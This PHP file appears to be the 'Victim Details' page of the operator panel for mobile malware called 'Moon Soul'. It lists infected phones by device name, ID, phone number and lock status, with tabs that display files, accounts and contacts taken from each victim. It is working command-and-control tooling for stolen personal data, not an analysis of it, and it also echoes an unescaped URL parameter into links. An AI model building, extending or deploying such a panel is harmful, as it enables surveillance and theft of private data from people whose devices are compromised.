<?php
session_start();
require_once 'includes/auth.php';
require_once 'includes/functions.php';

Auth::check();

$victimId = $_GET['id'];
$victim = getVictim($victimId);
$victimData = getVictimData($victimId);
$tab = $_GET['tab'] ?? 'files';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victim Details · Moon Soul</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, system-ui, sans-serif;
        }
        
        body {
            background: #0a0f1e;
            min-height: 100vh;
        }
        
        .container {
            max-width: 450px;
            margin: 0 auto;
            background: #0f1525;
            min-height: 100vh;
            padding: 20px;
        }
        
        .back-btn {
            color: white;
            font-size: 24px;
            margin-bottom: 20px;
            cursor: pointer;
        }
        
        .victim-header {
            background: #141b2b;
            border-radius: 30px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #a855f7;
        }
        
        .victim-title {
            color: white;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .victim-info {
            color: #9ca3af;
            font-size: 14px;
            margin: 5px 0;
        }
        
        .data-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .data-tab {
            flex: 1;
            padding: 12px;
            background: #141b2b;
            border: 1px solid #1e2a3a;
            border-radius: 25px;
            color: white;
            text-align: center;
            cursor: pointer;
        }
        
        .data-tab.active {
            background: linear-gradient(135deg, #a855f7, #3b82f6);
        }
        
        .data-item {
            background: #141b2b;
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 10px;
            border: 1px solid #1e2a3a;
        }
        
        .data-type {
            color: #a855f7;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .data-content {
            color: white;
            font-size: 14px;
        }
        
        .data-time {
            color: #6b7280;
            font-size: 11px;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="back-btn" onclick="history.back()">← Back</div>
        
        <div class="victim-header">
            <div class="victim-title">📱 <?= htmlspecialchars($victim['device_name']) ?></div>
            <div class="victim-info">ID: <?= htmlspecialchars($victim['device_id']) ?></div>
            <div class="victim-info">📞 <?= htmlspecialchars($victim['phone_number']) ?></div>
            <div class="victim-info">Status: <?= $victim['is_locked'] ? '🔒 Locked' : '🟢 Online' ?></div>
        </div>
        
        <div class="data-tabs">
            <div class="data-tab <?= $tab == 'files' ? 'active' : '' ?>" onclick="window.location.href='?id=<?= $victimId ?>&tab=files'">📁 Files</div>
            <div class="data-tab <?= $tab == 'accounts' ? 'active' : '' ?>" onclick="window.location.href='?id=<?= $victimId ?>&tab=accounts'">👤 Accounts</div>
            <div class="data-tab <?= $tab == 'contacts' ? 'active' : '' ?>" onclick="window.location.href='?id=<?= $victimId ?>&tab=contacts'">📇 Contacts</div>
        </div>
        
        <div id="dataList">
            <?php foreach ($victimData as $data): ?>
                <?php if ($tab == 'files' && $data['data_type'] == 'file'): ?>
                <div class="data-item">
                    <div class="data-type">📁 FILE</div>
                    <div class="data-content"><?= htmlspecialchars($data['data_content']) ?></div>
                    <div class="data-time"><?= $data['created_at'] ?></div>
                </div>
                <?php elseif ($tab == 'accounts' && $data['data_type'] == 'account'): ?>
                <div class="data-item">
                    <div class="data-type">👤 ACCOUNT</div>
                    <div class="data-content"><?= htmlspecialchars($data['data_content']) ?></div>
                    <div class="data-time"><?= $data['created_at'] ?></div>
                </div>
                <?php elseif ($tab == 'contacts' && $data['data_type'] == 'contact'): ?>
                <div class="data-item">
                    <div class="data-type">📇 CONTACT</div>
                    <div class="data-content"><?= htmlspecialchars($data['data_content']) ?></div>
                    <div class="data-time"><?= $data['created_at'] ?></div>
                </div>
                <?php endif; ?>
            <?php endforeach; ?>
        </div>
    </div>
</body>
</html>
